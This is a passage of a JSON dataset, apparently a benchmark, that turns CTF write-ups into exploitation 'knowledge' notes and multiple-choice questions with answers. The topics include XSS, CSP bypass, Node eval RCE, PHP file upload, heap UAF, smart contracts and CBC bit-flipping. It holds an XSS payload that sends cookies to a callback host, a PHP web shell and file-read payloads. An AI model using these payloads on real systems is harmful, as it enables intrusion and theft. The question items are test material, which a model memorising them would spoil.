            "In an environment where direct data extraction is prohibited, how can CSS be used to perform a side-channel attack to exfiltrate data? - A. By modifying CSS variables based on JavaScript calculations. - B. By leveraging CSS variables and animations to conditionally load external resources based on the page's content. - C. By using CSS media queries to adapt the layout to screen size, thereby leaking information. - D. By employing CSS comments to encode secret data within the stylesheet. ",
            "Given the challenge of browser caching and frame dropping, what method can be applied to ensure the successful exfiltration of segmented secret data using CSS? - A. Utilize JavaScript to dynamically inject CSS rules that force the browser to avoid caching. - B. Encode the entire secret into a single CSS variable to avoid segmentation. - C. Break the secret into smaller units and use different CSS properties to load various image segments, circumventing caching and frame dropping issues. - D. Increase the size of the CSS file to slow down the browser, preventing frame dropping. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "umassdining",
        "write_up": "dataset/raw/umassdining.md",
        "type": "web",
        "competition": [
            "UMassCTF/2022",
            "https://ctftime.org/event/1561/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "To circumvent Content Security Policy (CSP) restrictions in scenarios where the CSP includes `'unsafe-eval'` but restricts other sources, consider exploiting the use of JavaScript's `setTimeout` function or similar functions that evaluate a string as JavaScript code. This approach allows for executing arbitrary JavaScript in environments where inline scripts or external scripts from non-whitelisted sources are blocked. Example payload structure for XSS exploitation under such a configuration could be:\n```\n<p id=\"debug\" data-iloveumass=\"'); [YOUR_PAYLOAD_HERE]; //\"><script src=/static/js/thing.js></script>\n```\nReplace `[YOUR_PAYLOAD_HERE]` with the actual JavaScript code intended for execution.",
            "When attempting to extract sensitive information such as cookies in environments with strict CSP rules, double encoding the payload can ensure that it remains correctly formatted after it undergoes decoding by the application or the targeted user's browser. This method is particularly useful in scenarios where the injection point involves parameters in a URL or HTML attributes. An XSS payload designed to leak an admin's cookie with double encoding might look as follows:\n```\nPOST /register\n\nemail=asd%40foo.com&essay=<p%2bid%253d\"debug\"%2b%2bdata-iloveumass%253d\"')%253b%2bwindow.location%2b%253d%2b'http%253a//YOUR_CALLBACK_URL/cookie%253d'%252bencodeURIComponent(btoa(document.cookie))%253b%2b//\">%2b<script%2bsrc%253d/static/js/thing.js></script>\n```\nReplace `YOUR_CALLBACK_URL` with the URL intended to receive the leaked cookie data."
        ],
        "question": [
            "In a challenge, the Content-Security-Policy (CSP) is set to allow scripts from the same origin and 'unsafe-eval'. Which of the following techniques would be best suited to exploit a scenario involving the inclusion of attacker-controlled JavaScript through the misuse of a string evaluation function like `setTimeout` under the given CSP restrictions? - A. Injecting an external script from a different origin. - B. Directly inserting an inline `<script>` tag into the DOM. - C. Utilizing `setTimeout` with a string payload that leverages the 'unsafe-eval' permission to execute arbitrary JavaScript. - D. Embedding an `<iframe>` to execute JavaScript from a whitelisted source.",
            "When faced with stringent CSP rules that prevent traditional XSS payloads from executing correctly due to encoding issues, why might an attacker choose to use double encoding in their payload, as demonstrated in an essay submission vulnerability? - A. To bypass input validation mechanisms by obscuring SQL injection payloads. - B. To ensure the payload remains intact through application or browser decoding processes, allowing for successful exploitation of XSS vulnerabilities. - C. To increase the payload size unnecessarily and trigger buffer overflow vulnerabilities on the server. - D. To confuse web application firewalls (WAFs) by presenting the payload in an unreadable format."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "UnbreakMyStart",
        "write_up": "dataset/raw/UnbreakMyStart.md",
        "type": "forensics",
        "competition": [
            "Hackover/2018",
            "https://ctftime.org/event/689/tasks/"
        ],
        "score": 337,
        "max_score": 500,
        "difficulty": 0.674,
        "knowledge": [
            "When confronted with a corrupted archive that displays a mixed signature of formats in its hexadecimal dump (e.g., a `zip` header in an `xz` archive), determine the correct format's specifications and restore its original header. For an `xz` file, this includes replacing the incorrect header with the correct magic bytes `0xFD, \"7xXZ\", 0x00`, stream flags, and a CRC32 checksum that matches the footer's stream flags. \n   Example actions include calculating the CRC32 with command line tools (`printf \"\\x00\\x04\" | cksum -o 3 | cut -d \" \" -f 1`) and reconstructing the file header accordingly.",
            "When modifying binary files to fix corrupted headers, utilize tools like `dd` to trim the corrupted part and then `cat` combined with `printf` to prepend the correct header. This technique can restore access to the contained data when the corruption is isolated to the file's start. Specifically, for `xz` archives, after repairing the header, the file can be decompressed and extracted normally using `xz -d` and `tar` commands.\n   Example command sequence for fixing and extracting: \n   ```\n   dd if=corrupted_file.xz of=trimmed.bin bs=1 skip=11\n   (printf \"\\xFD7zXZ\\x00\\x00\\x04\"; cat trimmed.bin) > fixed.tar.xz\n   xz -d fixed.tar.xz\n   tar zxvf fixed.tar\n   ```"
        ],
        "question": [
            "When repairing a corrupted archive that appears to begin with a `zip` file signature (`PK`) but is supposed to be an `xz` format file, what are the correct magic bytes to prepend for the `xz` file's header? - A. `0x50, 0x4B, 0x03, 0x04` - B. `0xFD, \"7zXZ\", 0x00` - C. `0xFF, \"Rar!\", 0x1A` - D. `0x1F, 0x8B, 0x08`",
            "Which command sequence accurately describes the process of correcting the header of a corrupted `xz` archive and successfully accessing its contents? - A. `dd if=corrupted_file.xz of=trimmed.bin bs=1 skip=11; xz -d trimmed.bin; tar zxvf trimmed.bin` - B. `tar xvf corrupted_file.xz; dd if=corrupted_file.xz of=fixed.tar.xz bs=1 skip=11` - C. `(printf \"\\xFD7zXZ\\x00\\x00\\x04\"; cat trimmed.bin) > fixed.tar.xz; xz -d fixed.tar.xz; tar zxvf fixed.tar` - D. `mv corrupted_file.xz fixed.tar.xz; xz -d fixed.tar.xz; unzip fixed.tar`"
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Unionized",
        "write_up": "dataset/raw/Unionized.md",
        "type": "reverse",
        "competition": [
            "MetaCTF/2021",
            "https://ctftime.org/event/1476/tasks/"
        ],
        "score": 275,
        "max_score": 550,
        "difficulty": 0.5,
        "knowledge": [
            "In a scenario where a binary uses unions for different data types (e.g., string, integer), changing an object's type from string to a smaller data type (e.g., char) and back allows for writing or reading from arbitrary addresses. This technique leverages the behavior that if the new string size is less than the previously allocated size, the program uses the existing pointer, potentially leading to arbitrary read/write vulnerabilities.\n    - To demonstrate an arbitrary write, first create an object of type string with a certain length, then modify the object type to a char (or another smaller data type) and change it back to a string with a smaller size than initially allocated. This step prevents the allocation of new memory, manipulating the program to use the address contained in the smaller data type for subsequent operations.",
            "For heap-based vulnerabilities in the presence of ASLR (Address Space Layout Randomization), including PIE (Position Independent Executable) enabled binaries, obtaining a memory leak can enable further exploitation by revealing base addresses of loaded binaries or functions. This can lead to calculating the addresses of other functions or gadgets required for exploitation.\n    - An example payload to leak addresses from the heap could involve first manipulating an object to point to a function pointer or other predictable heap addresses, followed by an action (e.g., displaying the object) that triggers reading the manipulated address, thus leaking its contents over stdout. By calculating offsets from the leaked address to target functions (e.g., a 'win' function), you can manipulate function pointers to achieve arbitrary code execution.\n\nThese methods form the basis of exploiting union-based vulnerabilities and leveraging arbitrary reads/writes for bypassing security mechanisms like ASLR and PIE in CTF challenges or real-world applications."
        ],
        "question": [
            "In the context of exploiting a program that utilizes a union consisting of multiple data types for storing objects, you first create an object with type string and set its length. Then, you change the object's type to an integer and assign it a new value. If you attempt to change the object back to a string with a smaller size than originally allocated, which of the following accurately describes the outcome?  - A. The program will always crash due to a segmentation fault. - B. A new memory allocation occurs, and the original string value is preserved. - C. The change to an integer followed by a smaller string allows writing to an arbitrary address contained in the integer value. - D. The program automatically corrects the type mismatch and prevents exploitation. ",
            "When dealing with a binary that has ASLR enabled, including PIE, and you have achieved an arbitrary read vulnerability through exploitation, which approach allows you to calculate the absolute address of other functions or needed offsets?  - A. Guessing the base address of the binary by statistically analyzing the probable loaded addresses. - B. Invoking system calls directly to bypass the need for calculating the base address. - C. Overwriting the return address on the stack with the estimated address of the 'win' function. - D. Using a leaked function pointer address to calculate the base address of the binary, thereby determining the address of the 'win' function. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "universal",
        "write_up": "dataset/raw/universal.md",
        "type": "reverse",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 481,
        "max_score": 500,
        "difficulty": 0.962,
        "knowledge": [
            "When dealing with obfuscated quantum circuits that only utilize `H`, `T`, and `CNOT` gates, one can determine the function of the circuit by isolating the sequences of gates without `CNOT` gates. This is particularly useful in circuits based on the Quantum Fourier Transform (QFT) adder, where the addition operation is implemented with `Rz` rotations, which can be represented by sequences of `H` and `T` gates. This approach simplifies the analysis of quantum circuits by focusing only on the single-qubit gate sequences that enact rotations, enabling the extraction of the added number by reconstructing the rotation angles.",
            "For classical simulation of quantum circuits that would theoretically require infeasible computational resources (such as a statevector of size `2^256`), using quantum circuit simulators like Qiskit can be highly efficient. These simulators can emulate the circuit's behavior without explicitly constructing the full statevector, making it practical to simulate circuits with a large number of qubits on classical hardware with relatively low memory and processing requirements. This approach can be used to verify the results of quantum algorithms or to extract information from quantum circuits without needing quantum computational resources.\n    - Example payload for simulating and extracting information from a quantum circuit with Qiskit:\n    ```python\n    from qiskit import QuantumCircuit, Aer, execute\n    simulator = Aer.get_backend('aer_simulator')\n    qc = QuantumCircuit.from_qasm_file(\"converted_circuit.qasm\")\n    qc.measure(list(range(256)), list(range(256)))\n    job = execute(qc, simulator)\n    result = job.result()\n    print(result.get_counts())\n    ```"
        ],
        "question": [
            "In analyzing obfuscated quantum circuits for quantum computing challenges, especially those that only include `H`, `T`, and `CNOT` gates, a common strategy involves focusing on portions of the circuit without `CNOT` gates to uncover the circuit's purpose. Given that `Rz` rotations in a Quantum Fourier Transform adder can be obfuscated into sequences of `H` and `T` gates, how can one deduce the addition performed by the circuit? - A. By isolating the longest sequences of `H` and `T` gates and interpreting them as `Rz` rotations to reconstruct the angle and thus the number being added. - B. By counting the number of `CNOT` gates and using their quantity to directly calculate the number being added. - C. By analyzing the initial and final states of qubits without considering the gates used in the process. - D. By converting all sequences of `H` and `T` gates back into their equivalent `Rz` rotations without analyzing their sequence or position. ",
            "In a scenario where efficiently simulating a quantum circuit on classical hardware is crucial, despite the theoretical requirement for large computational resources (e.g., simulating a statevector of size `2^256`), which approach using Qiskit demonstrates this capability effectively? - A. Explicitly generating the full statevector for each quantum state transformation in the circuit to ensure accurate simulation results. - B. Limiting the simulation to only a subset of qubits in the circuit that significantly reduces computational requirements. - C. Utilizing Qiskit's `aer_simulator` backend to execute the circuit and apply measurement operations to all qubits, thereby efficiently emulating the circuit's behavior without constructing the full statevector. - D. Simulating the quantum circuit gate-by-gate with classical logic gates to reduce the computational overhead associated with quantum state representations. "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "UnknownOrigin",
        "write_up": "dataset/raw/UnknownOrigin.md",
        "type": "web",
        "competition": [
            "CyberSecurityRumble/2021",
            "https://ctftime.org/event/1429/tasks/"
        ],
        "score": 146,
        "max_score": 760,
        "difficulty": 0.19210526315789472,
        "knowledge": [
            "When interacting with smart contracts for ownership control, especially in challenges where the condition `msg.sender != tx.origin` is used as a security mechanism, one effective strategy is to deploy a secondary contract that interacts with the target contract. This is because `tx.origin` refers to the original caller of the transaction (typically the user\u2019s address) and cannot be a contract address, whereas `msg.sender` can be the address of a contract calling another contract. This method allows for the bypassing of ownership restrictions by ensuring that `msg.sender` and `tx.origin` are different, satisfying the condition set by the modifier.",
            "To modify the owner of a smart contract in a blockchain-based CTF challenge without directly satisfying contract conditions (like `onlyOwned` modifiers), consider creating and deploying a malicious contract that interacts with the target contract. The malicious contract should include a function that calls the ownership-changing function of the target contract. This way, the `msg.sender` in the context of the target contract becomes the address of the malicious contract, potentially bypassing security checks that compare `msg.sender` with `tx.origin`.\n   \n   Sample code snippet for the malicious contract:\n   ```solidity\n   // SPDX-License-Identifier: MIT\n   pragma solidity ^0.6.0;\n   \n   import \"./UnknownOrigin.sol\";\n   \n   contract AttackerOrigin {\n      UnknownOrigin public unknownOrigin = UnknownOrigin(YOUR_CHALLENGE_CONTRACT_ADDRESS);\n   \n      function attackOwner(address _owner) public {\n          unknownOrigin.updateOwner(_owner);\n      }\n   }\n   ```"
        ],
        "question": [
            "In a blockchain CTF challenge featuring smart contracts, how can an attacker bypass a security mechanism that prevents contract ownership changes by ensuring `msg.sender` is not the same as `tx.origin`?  - A. Deploy a front-end interface that interacts directly with the target contract. - B. Utilize a high gas price to override the security mechanism. - C. Create and deploy another contract to interact with the target contract, thereby having `msg.sender` (the malicious contract's address) differ from `tx.origin` (the user's address). - D. Modify the target contract's code to remove the security mechanism. ",
            "When the goal is to change the ownership of a smart contract in a situation where direct interaction is restricted by a modifier that checks for `msg.sender != tx.origin`, which of the following is a valid strategy?  - A. Directly call the `updateOwner` function from a web3.js script injected into the browser. - B. Set up a phishing site to trick the contract owner into transferring ownership. - C. Increase the gas limit for transactions to bypass conditional checks. - D. Craft and deploy a malicious contract that calls the `updateOwner` function of the target contract, making `msg.sender` the address of the malicious contract. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Unnormalized-form Data",
        "write_up": "dataset/raw/Unnormalized-form Data.md",
        "type": "misc",
        "competition": [
            "Harekaze/2018",
            "https://ctftime.org/event/549/tasks/"
        ],
        "score": 127,
        "max_score": 350,
        "difficulty": 0.3628571428571429,
        "knowledge": [
            "When dealing with SQL challenges in CTFs that involve recursive relations and functions, modifying the provided SQL functions to adjust their parameters or the conditions within can help reveal hidden or obscured data segments, especially when conditions like `WHERE i = x` are involved. This is applicable in scenarios where the data relationship is complex and indirect, such as when data is stored in non-traditional formats or relations that are not easily readable without processing. \n\n    - Example modification: \n      ```sql\n      CREATE FUNCTION flag(idx integer) RETURNS text AS $$\n      ...\n      SELECT c FROM r, dic WHERE i = idx AND r.a::TEXT[] @> dic.a ORDER BY j) AS t$$;\n      ```",
            "In scenarios requiring analysis of data progression or transformation, iterating over a range of values (like sequence numbers or steps in a process) and observing the output can uncover patterns or results not visible with a static or default view. This technique is specifically valuable in CTF challenges that involve data encryption, compression, or complex transformations where the output depends on variable states.\n\n    - Example iteration script:\n      ```sh\n      for i in {0..40}; do \n        psql -U postgres -d unf -c \"SELECT FLAG($i)\" >> dump;\n      done;\n      ```"
        ],
        "question": [
            "In a Capture the Flag (CTF) competition scenario dealing with SQL challenges, if a participant encounters a function designed to return certain data based on an index passed as a parameter, which SQL function modification could theoretically make it easier to analyze and possibly manipulate the function's output to reveal hidden data or patterns?  - A. Changing the function to accept an array of integers instead of a single integer as its parameter. - B. Removing the parameter entirely and hard-coding a specific value within the function. - C. Modifying the function signature to receive an integer as a parameter and adjusting the data selection criteria based on this parameter. - D. Altering the function to perform additional unrelated calculations that don't affect the output directly. ",
            "During a cybersecurity competition focusing on database analysis, you encounter a challenge that involves iterating over a sequence of values to modify the outcome of a database query dynamically. What scripting approach could be most effective for testing multiple sequential inputs to observe various outputs from a modified database function?  - A. Writing a for loop in Bash that iterates over a hardcoded list of non-sequential numbers to pass as parameters to a modified database query function. - B. Creating an infinite while loop in Bash that continually calls the modified database query function with a random number. - C. Developing a for loop in Bash to iterate over a defined range of sequential numbers, passing each number as a parameter to a modified database query function. - D. Using a case statement in Bash to selectively call the modified database query function with a set of predefined constants. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Unsafereputation",
        "write_up": "dataset/raw/Unsafereputation.md",
        "type": "This challenge is a **web** type challenge.",
        "competition": [
            "Shakti/2021",
            "https://ctftime.org/event/1251/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "When facing JavaScript-based web applications that utilize `eval()` for executing code dynamically, it's actionable to test for Remote Code Execution (RCE) vulnerabilities by bypassing blacklist filters. These filters commonly attempt to block dangerous functions or keywords. Bypassing can be achieved by using alternative code execution methods not covered by the blacklist, like leveraging the `require('fs')` to read or manipulate filesystem contents in a Node.js environment.  \nExample payload: `require('fs').readFileSync('filename').toString()`",
            "In scenarios where the direct method to read or find sensitive information, such as flag files, is obfuscated or the file's location is non-standard, one can resort to utilizing filesystem manipulation or listing capabilities to enumerate the directories and files on the server. This approach is especially useful when certain keywords or functions are blocked, and direct access to the flag is not possible.  \nExample payload: `require('fs').readdirSync('.').toString()`"
        ],
        "question": [
            "In a JavaScript-based web application, an attacker aims to bypass a blacklist filter in an `eval()` function to achieve Remote Code Execution (RCE). The blacklist includes keywords like 'system', 'child_process', 'exec', 'spawn', 'eval'. Which of the following payloads would possibly bypass this filtering and execute code to read a file named \"example.txt\"? - A. `eval('require(\"child_process\").exec(\"cat example.txt\")')` - B. `require('fs').readFileSync('example.txt').toString()` - C. `'system'.exec('cat example.txt')` - D. `spawn('cat', ['example.txt'])`",
            "When direct file access is restricted and sensitive files are hidden in non-standard locations, which Node.js method can be effectively utilized to list all available files and directories in the current working directory as a step towards locating these files? - A. `document.listDirectoryContents('.')` - B. `fileSystem.showAllFiles('.')` - C. `require('fs').readdirSync('.').toString()` - D. `listAllFilesInDir('.')`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Unvreakable Vase",
        "write_up": "dataset/raw/Unvreakable Vase.md",
        "type": "crypto",
        "competition": [
            "NahamCon/2020",
            "https://ctftime.org/event/1067/tasks/"
        ],
        "score": 125,
        "max_score": 1000,
        "difficulty": 0.125,
        "knowledge": [
            "When dealing with ciphertext that may have undergone case manipulation, particularly with Base64 encoded strings where both uppercase and lowercase characters are significant for decoding, one can iteratively test all case permutations of the encoded string to recover the original message. This approach is especially useful when direct decoding yields non-meaningful results due to case sensitivity issues in the encoded data. Use Python's `base64.b64decode()` function combined with a function to modify the case of characters in the string according to binary representations of numbers to methodically test every possible case combination.",
            "To verify whether a decoded base64 block corresponds to valid text (in the context of CTF challenges, a flag), implement a validation function that checks if the decoded output consists solely of printable ASCII characters. This helps in filtering out invalid decoding results automatically during the brute-force process of case permutation testing. ASCII values less than 32 are typically control characters and not used in readable text, providing a simple yet effective validation condition."
        ],
        "question": [
            "In a CTF challenge where Base64 encoded data is suspected to have undergone case manipulation, affecting its correct decoding, consider the following Python function snippet for adjusting the case of characters in a Base64 encoded string:  ```python def tryCase(n,i): b = format(i, '#06b')[2:] c1, c2, c3, c4 = n[0], n[1], n[2], n[3] if b[0] == '1': c1 = c1.upper() if b[1] == '1': c2 = c2.upper() if b[2] == '1': c3 = c3.upper() if b[3] == '1': c4 = c4.upper() return c1 + c2 + c3 + c4 ```  Which Python module and function is essential to decode the modified base64 string after adjusting its case with the `tryCase` function?  - A. `os.system()` - B. `base64.b64decode()` - C. `hashlib.md5()` - D. `subprocess.Popen()` ",
            "In a scenario where a script is used to decode a text presumed to contain the flag but encoded in base64 with potential case sensitivity issues, a validation function is employed to check if the decoded text contains printable ASCII characters. The function snippet provided is as follows:  ```python def isValid(n): try: b = n.decode() for i in b: if ord(i) < 32: return False return True except: return False ```  Based on this code snippet, what is the primary purpose of the validation condition `if ord(i) < 32:`?  - A. To ensure that the decoded text contains only uppercase letters - B. To check if the decoded text consists solely of numeric characters - C. To confirm that the decoded text includes no control characters, ensuring it contains printable ASCII characters - D. To validate that the decoded text is encrypted using a specific cipher "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Upgreadable Casino",
        "write_up": "dataset/raw/Upgreadable Casino.md",
        "type": "The type of challenge described in this write-up is a **crypto** challenge.",
        "competition": [
            "DaVinci/2023",
            "https://ctftime.org/event/1858/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving smart contract proxies and `delegatecall`, scrutinize the variable storage layout for potential overlap between the proxy and its implementation. This condition applies specifically when smart contracts use delegate calls to forward calls and share state. Target variables in the implementing contract may be manipulated accidentally or intentionally via the proxy due to the shared storage layout, particularly if the variable sizes and their order create an alignment that overlaps with proxy storage variables such as the implementation address.\n    - No specific payload example due to dependency on contract addresses and state.",
            "Beware of integer overflow vulnerabilities in smart contracts, especially in functions that perform arithmetic operations without proper checks. Conditions where multiple inputs are summed and compared against another value are particularly ripe for this issue. By carefully crafting inputs that result in an overflow, one can bypass checks or, in some cases, manipulate contract state in unintended ways. This knowledge is universally applicable to any smart contract or programming scenario where unchecked arithmetic can lead to overflow or underflow conditions.\n    - Example exploit methodology: Use input values for token quantities that, when summed, overflow and reset to a lower value that is unexpectedly less than the user\u2019s balance, manipulating the contract\u2019s logic to achieve a desired state change.\n    - Sample payload: `target.playTokens(0xFFFFFFFFFFFFFFFF, 1, 0, 0)`, assuming this sum overflows and bypasses balance checks due to an overflow that's not handled."
        ],
        "question": [
            "When exploiting smart contract proxies with `delegatecall`, if an attempt is made to change casino game tokens (e.g., for Blackjack, Slot Machine, Roulette) through the proxy, how does the storage layout affect the outcome? - A. The change will not affect the casino's storage due to sandboxing. - B. Proxy storage variables, such as the implementation address, can be accidentally overwritten if they overlap with the contract variables being manipulated. - C. The proxy automatically prevents any storage overlaps, ensuring isolated variable storage. - D. Changes in game tokens will be reverted unless the caller is the proxy owner.",
            "In the context of smart contracts, how can integer overflow be exploited in a function that sums inputs without proper overflow checks? - A. By providing a sequence of inputs that sum up to a value greater than the contract's total supply, forcing it to mint new tokens. - B. By summing inputs that cause underflow, resulting in maximum integer values. - C. By crafting input values that, when summed, overflow and result in a value that is lower than expected, potentially bypassing checks or altering state in unintended ways. - D. Overflow is not a relevant concern in smart contracts as all arithmetic operations are checked by default."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Upload Fun",
        "write_up": "dataset/raw/Upload Fun.md",
        "type": "web",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In web challenges allowing file uploads, if error handling reveals file paths or system information, an excessively long filename can be used to trigger such errors. This method is a viable vector for uncovering server-side secrets or configurations (e.g., the naming pattern of uploaded files) that can be leveraged for further exploitation. This approach is especially useful when direct feedback on the upload's success, location, or name is not provided by the application itself.",
            "When a web application includes files based on user input, even if directory traversal (`..`) is filtered out, it's vital to consider alternate bypass methods or to leverage known server configurations (identified through error messages or other means) to include malicious files. By creating a file with a known name (or name pattern) that contains exploitable PHP code or other server-side scripts, attackers can execute arbitrary code. This is contingent upon having the capability to indirectly ascertain the full path or naming convention of the uploaded file, which might be possible through error message analysis or predictable hash values when server-side details are known.\n\nExample payload for uploading a PHP file to execute arbitrary system commands: \n```php\n<?php\n    echo system($_GET[\"cmd\"]);\n?>\n```"
        ],
        "question": [
            "In a given web challenge, a technique to trigger error messages by submitting an excessively long filename during file upload was employed. This method aimed to expose server-side information or file path details. Which of the following best describes the reason for using a long filename for file uploads? - A. To test the upload speed and performance optimization of the web server. - B. To bypass the file size limit checks by increasing the filename length. - C. To induce an error message that might reveal the naming pattern of uploaded files or other server configurations beneficial for further exploitation. - D. To ensure that the file stands out in the directory listing for easy identification. ",
            "Considering a scenario where an attacker has uploaded a PHP file that includes the code `<?php echo system($_GET[\"cmd\"]); ?>`, aiming to execute arbitrary commands on the web server. Assuming the attacker has found a way to predict or determine the name or path of the uploaded file, which of the following approaches would render this exploitation attempt successful? - A. Modifying the .htaccess file to prevent direct access to the upload directory. - B. Creating a regex filter to remove any PHP tags from uploaded files. - C. Including the uploaded file with a dynamic, user-controllable filename to execute the contained PHP code. - D. Employing file extension whitelisting to only allow image files. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "UploadCenter",
        "write_up": "dataset/raw/UploadCenter.md",
        "type": "This write-up describes a **pwn** challenge.",
        "competition": [
            "0CTF/2017/Quals",
            "https://ctftime.org/event/402/tasks/"
        ],
        "score": 523,
        "max_score": 687,
        "difficulty": 0.7612809315866085,
        "knowledge": [
            "When exploiting Use-After-Free (UAF) vulnerabilities involving mismatched allocation and deallocation sizes, such as using mmap and munmap, manipulating the size parameters can lead to unintended memory being mapped or unmapped. This can create conditions for arbitrary code execution, by carefully crafting payloads that interact with program data structures in memory. The specific example involves creating a memory layout condition through uploading a large PNG file to ensure subsequent memory operations (such as thread stack allocation) occur in a predictable location, allowing for control over executable paths through return address overwriting.",
            "Concurrent thread behavior in CTF challenges can impact exploit development, particularly when multiple threads read from the same file descriptor. The input may not be received in the expected order due to the scheduler's decision on thread execution. Understanding this behavior is crucial when designing exploits that rely on precise input manipulation. To mitigate potential issues from such non-determinism, sending additional characters (such as newline characters) before the payload can ensure the intended thread processes the exploit payload first, thereby increasing the exploit's reliability. This technique is especially vital when attempting to control program flow or manipulate memory in a multi-threaded environment.\n\nExample payload adjustment for dealing with non-deterministic input processing by threads:\n```\n\\n[payload]\n```\nNote: This sample demonstrates how to precede the actual exploit payload with a newline character to influence the order in which threads receive and process input, enhancing the exploit's effectiveness in the described scenario."
        ],
        "question": [
            "In the context of exploiting a Use-After-Free (UAF) vulnerability where the size parameters of `mmap` and `munmap` calls are mismatched, what strategy can an attacker use to manipulate program execution? - A. Overwrite a local variable to manipulate the control flow within a single function. - B. Create a condition where memory operations like thread stack allocation occur in a predictable location, allowing for control over executable paths through return address overwriting. - C. Directly inject shellcode into unused memory regions without affecting program execution flow. - D. Manipulate thread scheduling to control the order of execution.",
            "When dealing with non-deterministic input processing by threads in a multi-threaded application, which of the following techniques is recommended to ensure the intended thread processes an exploit payload first? - A. Increase the processing priority of the target thread via system calls. - B. Utilize mutexes to synchronize input processing between threads. - C. Sending additional characters (such as newline characters) before the payload. - D. Force the unwanted thread into a sleep state until the targeted thread processes the input."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Useless admin",
        "write_up": "dataset/raw/Useless admin.md",
        "type": "crypto",
        "competition": [
            "Securinets/2019/Quals",
            "https://ctftime.org/event/769/tasks/"
        ],
        "score": 970,
        "max_score": 1000,
        "difficulty": 0.97,
        "knowledge": [
            "When handling challenges that involve multiple ciphertexts encrypted with the same OTP (One-Time Pad) key, the security of the encryption is compromised. This scenario provides an exploitable vulnerability because the XOR operation used in OTP is linear, allowing attackers to derive information about the plaintexts if they have access to multiple ciphertexts encrypted with the same key. A common approach to exploit this vulnerability is to use cryptanalysis techniques or scripts designed to automate the analysis and recovery of plaintext from multiple ciphertexts encrypted under the same key.",
            "For challenges similar to the \"Useless admin\" where there is a need to decrypt ciphertexts encrypted with the same OTP key, an effective method is the use of a script that applies known plaintext attacks or leverages the properties of XOR. This can be especially effective if at least one of the plaintexts is partially known or if there is a way to guess parts of it. By XORing the ciphertexts against each other, the script can exploit the linear properties of XOR to cancel out the key and recover plaintext data, or even the key itself if enough plaintext-ciphertext pairs are known. \n\nExample payload (conceptual, not direct code):\n```\n# Assume c1 and c2 are two ciphertexts encrypted with the same key\n# XORing them together cancels out the key, leaving us with the XOR of the two plaintexts\nxor_c1_c2 = c1 XOR c2\n# If parts of the plaintext are known or can be guessed, it's possible to recover other parts\n```\nNote: The actual implementation would depend on the specifics of the challenge, including the format of the ciphertexts and any known information about the plaintexts."
        ],
        "question": [
            "In the context of cryptographic attacks, when multiple ciphertexts have been encrypted using the same One-Time Pad (OTP) key, it introduces a significant vulnerability. Given the property that XOR is linear, which of the following approaches best describes how an attacker could exploit this vulnerability to derive information about the plaintexts? - A. Generate new OTP keys for each ciphertext to increase encryption strength. - B. Use RSA decryption without the need for a private key. - C. Apply cryptanalysis techniques to exploit the linear properties of XOR, allowing recovery of plaintext from multiple ciphertexts encrypted under the same key. - D. Encrypt the ciphertexts again with a different algorithm to secure the leaked information. ",
            "In scenarios where ciphertexts have been encrypted with the same One-Time Pad key and decryption is required, leveraging the XOR operation's properties is a known approach. Which statement correctly describes a conceptual method for exploiting these properties to aid in decrypting the ciphertexts? - A. Concatenate all ciphertexts and apply a hash function to decrypt. - B. Use the XOR operation between ciphertexts to cancel out the key and reveal the XOR of the plaintexts, exploiting known plaintext parts if available. - C. Encrypt the ciphertexts with another OTP key to enhance security. - D. Perform a dictionary attack on each ciphertext individually without considering the XOR properties. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "USSH 3",
        "write_up": "dataset/raw/USSH 3.0.md",
        "type": "crypto",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with block ciphers in encryption, modifying the Initialization Vector (IV) can manipulate the plaintext post-decryption without altering the ciphertext. This principle can be applied to change application behavior based on decrypted content. For instance, flipping a bit in the IV corresponding to a specific bit in the plaintext can modify user roles or permissions if these are determined by the decrypted text. This method is useful in scenarios where direct modification to encrypted data is not feasible but where IV manipulation can induce a predictable change in the decryption output.",
            "If a block cipher in CBC mode encryption presents a scenario with user-controlled input that fills a whole block, subsequent blocks can be altered without breaking the encryption scheme's integrity by using bit-flipping attacks on the ciphertext. This technique is particularly effective for altering application-level data when you can control or predict the structure of the plaintext, such as JSON-formatted strings. Manipulating the ciphertext of a block that's exclusively user-controlled can be utilized to inject or modify data in following blocks, thereby achieving unauthorized actions within the application.\n\nExample payload for changing a user group to \"root\" when the predictable structure is in place and initial group is \"regular\":\n```python\nxor_block = [0] * 23 + list(map(ord, xor_string('regular)', 'root)   '))) + [i] + [0] * 16\nct = xor_string(\"\".join(map(chr, xor_block)), real_ct)\nnew_session = base64.b64encode(iv) + \":\" + base64.b64encode(ct)\nsend(s, 'session --set ' + new_session)\n```"
        ],
        "question": [
            "In the context of block cipher encryption, what is the primary impact of altering the Initialization Vector (IV) directly related to the decrypted data? - A. It leads to a direct change in the symmetric key, requiring re-encryption of all data. - B. Modifying the IV directly alters the encrypted ciphertext without the need to decrypt and re-encrypt. - C. Changing the IV results in the modification of the decrypted output while leaving the original ciphertext unchanged. - D. It enhances the encryption strength by adding an additional layer of complexity to the cipher block chaining.",
